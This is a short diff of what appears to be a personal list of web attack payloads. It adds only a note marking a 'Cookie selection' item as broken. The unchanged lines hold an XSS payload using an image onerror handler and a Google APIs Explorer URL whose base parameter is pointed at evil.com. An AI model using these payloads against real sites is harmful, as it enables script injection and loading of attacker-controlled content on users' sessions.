@@ -1,6 +1,11 @@
 <img src=z onerror=alert(document.domain)>
 https://developers.google.com/apis-explorer/?base=https://evil.com%23webapis-discovery.appspot.com/_ah/api#p/admin/reports_v1/
 
+-----------------------------
+
+Broken:
+- Panelleft: Cookie selection...
+
 
 -----------------------------
 
